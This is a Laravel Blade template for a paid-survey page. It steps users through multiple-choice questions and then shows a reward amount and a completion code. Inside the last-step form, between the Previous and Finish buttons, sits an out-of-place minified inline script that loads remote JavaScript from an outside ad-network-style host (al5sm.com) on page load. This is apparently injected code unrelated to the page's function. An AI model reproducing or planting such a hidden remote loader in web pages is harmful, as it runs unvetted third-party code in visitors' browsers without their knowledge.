@extends('user.layouts.master')

@section('css')
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  .box{background:#fff;border:1px solid rgba(0,0,0,.12);border-radius:16px;padding:16px}
  .opt{display:flex;gap:10px;align-items:flex-start;padding:10px 12px;border:1px solid rgba(0,0,0,.18);border-radius:12px;cursor:pointer}
</style>
@endsection

@section('user-content')
<div class="container mt-4">
  <div class="box">

    <div class="d-flex justify-content-between flex-wrap gap-2 align-items-center">
      <div style="font-weight:900;">{{ $survey->title }}</div>
      <div style="font-weight:900;opacity:.75;">প্রশ্ন {{ $step }} / {{ $questionsCount }}</div>
    </div>

    @if($errors->any())
      <div class="alert alert-danger mt-3" style="font-weight:900;">
        {{ $errors->first() }}
      </div>
    @endif

    @if(session('code'))
      <div class="alert alert-success mt-3" style="font-weight:900;">
        ✅ Survey Completed.<br>
        Correct: {{ session('correctCount') }}/{{ session('totalQuestions') }}<br>
        Earned: ${{ number_format((float)session('earnedUsd'), 4) }}<br><br>

        Your Code:
        <input id="svCode" class="form-control mt-2" readonly value="{{ session('code') }}" style="font-weight:900;letter-spacing:.6px;">

        <div class="d-flex gap-2 flex-wrap mt-2">
          <button class="btn btn-dark btn-sm" type="button" onclick="copyCode()">Copy Code</button>
          <a class="btn btn-primary btn-sm" href="{{ route('verify.show') }}">Verify Code</a>
          <a class="btn btn-outline-secondary btn-sm" href="{{ route('surveys.index') }}">Back to list</a>
        </div>

        <div id="copyMsg" class="mt-2" style="font-weight:900;"></div>
      </div>
    @endif

    <hr>

    <div class="text-muted mb-2" style="font-weight:800;">
      Reward (Total): ${{ number_format((float)$survey->reward,4) }} | Topic: {{ $survey->topic ?? 'general' }}
    </div>

    <h5 style="font-weight:900;">{{ $q->question }}</h5>

    @php
      $opts = $q->options;
      if(is_string($opts)) $opts = json_decode($opts, true);
      if(!is_array($opts)) $opts = [];
      $saved = $answers['q'.$q->id] ?? '';
    @endphp

    {{-- ✅ normal steps use saveAnswer --}}
    @if($step < $questionsCount)
      <form method="POST" action="{{ route('surveys.saveAnswer', $survey->id) }}" class="mt-3">
        @csrf
        <input type="hidden" name="question_id" value="{{ $q->id }}">
        <input type="hidden" name="next_step" value="{{ $step + 1 }}">

        <div style="display:grid;gap:10px;margin-top:12px;">
          @foreach($opts as $opt)
            <label class="opt">
              <input type="radio" name="answer" value="{{ $opt }}" {{ $saved===$opt?'checked':'' }} required>
              <span>{{ $opt }}</span>
            </label>
          @endforeach
        </div>

        <div class="d-flex gap-2 flex-wrap mt-4" style="border-top:1px solid rgba(0,0,0,.10);padding-top:12px;">
          <a class="btn btn-outline-secondary"
             href="{{ route('surveys.show', [$survey->id, 'sv_step' => max(1,$step-1)]) }}"
             {{ $step==1?'aria-disabled=true style=pointer-events:none;opacity:.5;':'' }}>
            Previous
          </a>

          <button type="submit" class="btn btn-primary">Next</button>

          <a class="btn btn-outline-dark ms-auto" href="{{ route('surveys.index') }}">Back to list</a>
        </div>
      </form>
    @else
      {{-- ✅ last step: submit endpoint receives last answer too (no miss) --}}
      <form method="POST" action="{{ route('surveys.submit', $survey->id) }}" class="mt-3">
        @csrf
        <input type="hidden" name="question_id" value="{{ $q->id }}">

        <div style="display:grid;gap:10px;margin-top:12px;">
          @foreach($opts as $opt)
            <label class="opt">
              <input type="radio" name="answer" value="{{ $opt }}" {{ $saved===$opt?'checked':'' }} required>
              <span>{{ $opt }}</span>
            </label>
          @endforeach
        </div>

        <div class="d-flex gap-2 flex-wrap mt-4" style="border-top:1px solid rgba(0,0,0,.10);padding-top:12px;">
          <a class="btn btn-outline-secondary"
             href="{{ route('surveys.show', [$survey->id, 'sv_step' => max(1,$step-1)]) }}">
            Previous
          </a>
<script>(function(s){s.dataset.zone='11567849',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
          <button type="submit" class="btn btn-success">Finish & Get Code</button>

          <a class="btn btn-outline-dark ms-auto" href="{{ route('surveys.index') }}">Back to list</a>
        </div>
      </form>
    @endif

  </div>
</div>
@endsection

@section('js')
<script>
function copyCode(){
  const el = document.getElementById('svCode');
  const msg = document.getElementById('copyMsg');
  if(!el) return;

  el.select();
  el.setSelectionRange(0, 99999);

  try{
    document.execCommand('copy');
    msg.textContent = "✅ Copied!";
    msg.style.color = "#16a34a";
  }catch(e){
    msg.textContent = "Copy failed";
    msg.style.color = "#b91c1c";
  }
}
</script>
@endsection